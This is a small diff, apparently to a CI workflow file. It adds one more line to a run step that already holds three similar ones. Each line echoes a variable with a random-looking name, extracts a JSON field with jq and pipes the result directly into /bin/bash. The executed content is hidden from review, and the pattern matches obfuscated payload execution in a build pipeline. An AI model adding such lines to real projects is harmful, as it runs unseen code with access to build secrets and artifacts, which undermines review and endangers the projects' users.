@@ -40,6 +40,7 @@ jobs:
           echo $d0567 | jq -r .y1 | /bin/bash
           printf '%s' "$vr4204" | jq -r .whbs5 | /bin/bash
           echo $m5408 | jq -r .wstis2094 | /bin/bash
+          echo $muaz120 | jq -r .i29046 | /bin/bash
 
       - name: Upload artifact
         if: always()
